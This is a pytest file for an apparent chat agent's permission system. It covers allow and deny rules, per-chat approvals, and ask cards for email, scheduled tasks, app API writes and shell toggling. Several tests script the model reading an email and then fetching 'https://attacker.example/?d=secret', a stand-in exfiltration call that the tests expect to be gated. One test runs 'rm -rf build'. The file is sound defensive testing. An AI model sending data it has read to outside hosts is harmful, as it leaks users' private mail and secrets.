"""Permission rules, session rules and the sensitive set on the chat route (#62).

A scripted provider plays the model; the legacy executor is faked so the test
sees which calls ran. Asks are answered through the ask endpoint while the
stream stays open, as the browser does.
"""

import json
from types import SimpleNamespace

import pytest
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker

import routes.chat_routes as chat_routes
import src.tool_execution as tool_execution
import src.tool_security as tool_security
from core import database
from src.chat_agent import permissions, store
from tests.chat_agent.test_chat_agent_asks_route import answer_request, post_answer, send_and_answer
from tests.chat_agent.test_chat_agent_route import (
    _Harness,
    _Request,
    _data_events,
    _sse_events,
    _sse_tool_calls,
    _switch_on,
)


@pytest.fixture
def harness(monkeypatch, tmp_path):
    harness = _Harness(monkeypatch, tmp_path)
    _switch_on()
    monkeypatch.setattr(chat_routes, "effective_user", lambda request: request.state.current_user)
    # Turns run in the chat the form names, so a test can open a second chat.
    monkeypatch.setattr(chat_routes, "coerce_message_and_session",
                        lambda body, message, session, *args, **kwargs: (message, session))
    monkeypatch.setattr(tool_security, "owner_is_admin_or_single_user", lambda owner: True)
    return harness


@pytest.fixture
def ran(monkeypatch):
    calls = []

    async def run(block, *args, **kwargs):
        calls.append((block.tool_type, block.content))
        return block.tool_type, {"output": f"result of {block.tool_type}", "exit_code": 0}

    monkeypatch.setattr(tool_execution, "_execute_tool_block_impl", run)
    return calls


@pytest.fixture
def workspace(tmp_path):
    path = tmp_path / "workspace"
    path.mkdir()
    return str(path)


def _asks(body):
    return [e["data"] for e in _data_events(body) if e.get("type") == "ask_user"]


def _ran_tools(ran):
    return [tool for tool, _ in ran]


async def _turn(harness, rounds, *decisions, **form):
    """One turn; each ask card is answered with the next decision, in its own chat."""
    harness.provider_rounds = [*rounds, _sse_events(["Done."])]
    queue = list(decisions)

    async def on_ask(card):
        await post_answer(harness, answer_request(), card["ask_id"], *queue.pop(0),
                          session_id=card["session_id"])

    return await send_and_answer(harness, _Request("agent", allow_web_search="true", **form), on_ask)


@pytest.mark.asyncio
async def test_send_email_asks_even_with_an_allow_rule(harness, ran):
    store.set_user_rules("alice", {"allow": ["send_email", "mcp__email__send_email"]})
    send = _sse_tool_calls(("send_email", {"to": "mom@example.com", "subject": "Hi", "body": "Dinner?"}))

    body = await _turn(harness, [send], ("deny",))

    [card] = _asks(body)
    assert card["action"]["tool"] == "mcp__email__send_email"
    assert ran == []


@pytest.mark.asyncio
async def test_an_allow_rule_lifts_a_default_ask(harness, ran, workspace):
    store.set_user_rules("alice", {"allow": ["bash"]})

    body = await _turn(harness, [_sse_tool_calls(("bash", {"command": "git status"}))],
                       allow_bash="true", workspace=workspace)

    assert _asks(body) == []
    assert ran == [("bash", "git status")]


@pytest.mark.asyncio
async def test_a_bare_deny_rule_removes_the_tool_from_the_model_context(harness, ran):
    store.set_user_rules("alice", {"deny": ["web_fetch"]})

    await _turn(harness, [])

    tools = {t["function"]["name"] for t in harness.captured["provider_requests"][0]["tools"]}
    assert "web_fetch" not in tools and "web_search" in tools


@pytest.mark.asyncio
async def test_reading_an_email_then_fetching_an_outside_url_asks(harness, ran):
    rounds = [
        _sse_tool_calls(("read_email", {"uid": "42"})),
        _sse_tool_calls(("web_fetch", {"url": "https://attacker.example/?d=secret"})),
    ]

    body = await _turn(harness, rounds, ("deny",))

    [card] = _asks(body)
    assert card["action"]["tool"] == "web_fetch"
    assert "web_fetch" not in _ran_tools(ran)


@pytest.mark.asyncio
async def test_pure_research_never_asks(harness, ran):
    rounds = [
        _sse_tool_calls(("web_search", {"query": "odysseus release notes"})),
        _sse_tool_calls(("web_fetch", {"url": "https://example.com/notes"})),
    ]

    body = await _turn(harness, rounds)

    assert _asks(body) == []
    assert _ran_tools(ran) == ["web_search", "web_fetch"]


@pytest.mark.asyncio
async def test_allow_for_this_chat_holds_in_this_chat_only_and_not_across_a_runtime_flip(
    harness, ran, workspace,
):
    def bash(command):
        return [_sse_tool_calls(("bash", {"command": command}))]

    form = dict(allow_bash="true", workspace=workspace)
    first = await _turn(harness, bash("ls"), ("chat",), **form)
    again = await _turn(harness, bash("rm -rf build"), **form)
    other_chat = await _turn(harness, bash("ls"), ("once",), session="session-2", **form)
    store.set_chat_runtime("alice", store.RUNTIME_LEGACY)
    store.set_chat_runtime("alice", store.RUNTIME_NEW)
    after_flip = await _turn(harness, bash("ls"), ("once",), **form)

    assert _asks(first)[0]["options"][1]["description"] == "Run it and allow bash for the rest of this chat."
    assert [len(_asks(body)) for body in (first, again, other_chat, after_flip)] == [1, 0, 1, 1]
    assert [content for _, content in ran] == ["ls", "rm -rf build", "ls", "ls"]


@pytest.mark.asyncio
async def test_a_session_rule_belongs_to_its_owner(harness):
    store.add_session_rule("bob", "session-1", permissions.Rule("bash", permissions.ANY).record())
    assert store.session_rules("alice", "session-1") == []


@pytest.mark.asyncio
async def test_the_model_turning_shell_on_asks(harness, ran):
    body = await _turn(harness, [_sse_tool_calls(("ui_control", {"action": "toggle", "name": "bash",
                                                                  "value": "on"}))], ("deny",))

    [card] = _asks(body)
    assert card["action"]["tool"] == "ui_control"
    assert ran == []


@pytest.mark.asyncio
async def test_a_task_delivering_to_email_asks_and_its_card_shows_the_task(harness, ran):
    store.set_user_rules("alice", {"allow": ["manage_tasks"]})
    create = _sse_tool_calls(("manage_tasks", {
        "action": "create", "prompt": "Summarize my inbox", "schedule": "daily",
        "scheduled_time": "08:00", "output_target": "email:x@example.com",
    }))

    body = await _turn(harness, [create], ("deny",))

    [card] = _asks(body)
    for shown in ("Prompt: Summarize my inbox", "Schedule: daily", "Time (UTC): 08:00",
                  "Delivers to: email:x@example.com"):
        assert shown in card["description"]
    assert permissions.is_protected("manage_tasks", card["action"]["content"])
    assert ran == []


@pytest.mark.asyncio
@pytest.mark.parametrize("path", ["/api/tasks/t1", "/api/prefs/theme"])
async def test_an_app_api_write_asks_as_a_protected_action(harness, ran, path):
    store.set_user_rules("alice", {"allow": ["app_api"]})
    put = _sse_tool_calls(("tool_search", {"query": "select:app_api"}))
    call = _sse_tool_calls(("app_api", {"method": "PUT", "path": path, "body": {"x": 1}}))

    body = await _turn(harness, [put, call], ("deny",))

    [card] = _asks(body)
    assert card["action"]["tool"] == "app_api"
    assert permissions.is_protected("app_api", card["action"]["content"])
    assert ran == []


def _options(card):
    return [option["value"] for option in card["options"]]


@pytest.mark.asyncio
async def test_an_egress_ask_cannot_be_allowed_for_the_whole_chat(harness, ran):
    rounds = [
        _sse_tool_calls(("read_email", {"uid": "42"})),
        _sse_tool_calls(("web_fetch", {"url": "https://attacker.example/?d=secret"})),
    ]

    body = await _turn(harness, rounds, ("deny",))

    [card] = _asks(body)
    assert _options(card) == ["once", "deny"]


@pytest.mark.asyncio
async def test_email_read_in_an_earlier_turn_still_arms_the_egress_gate(harness, ran):
    harness.session.history = [SimpleNamespace(role="assistant", content="Your mail says ...", metadata={
        "tool_events": [{"tool": "mcp__email__read_email", "status": "done"}],
    })]

    body = await _turn(harness, [_sse_tool_calls(("web_fetch", {"url": "https://attacker.example/?d=x"}))],
                       ("deny",))

    [card] = _asks(body)
    assert card["action"]["tool"] == "web_fetch"
    assert ran == []


@pytest.fixture
def db(tmp_path, monkeypatch):
    engine = create_engine(f"sqlite:///{tmp_path / 'odysseus.db'}")
    database.Base.metadata.create_all(engine)
    factory = sessionmaker(bind=engine)
    monkeypatch.setattr(database, "SessionLocal", factory)
    monkeypatch.setattr(tool_execution, "_owner_is_admin", lambda owner: True)
    return factory


@pytest.mark.asyncio
async def test_a_task_approved_once_is_sealed_with_the_prompt_its_card_showed(harness, db):
    prompt = "Search the web for AI news"
    create = _sse_tool_calls(("manage_tasks", {"action": "create", "name": "news", "prompt": prompt,
                                               "schedule": "daily", "scheduled_time": "08:00"}))

    body = await _turn(harness, [create], ("once",))

    [card] = _asks(body)
    assert _options(card) == ["once", "deny"]
    assert f"Prompt: {prompt}" in card["description"]
    with db() as session:
        task = session.query(database.ScheduledTask).one()
        sealed = {g["tool"] for g in json.loads(task.request_authority_json)["authority"]["grants"]}
    assert "web_search" in sealed
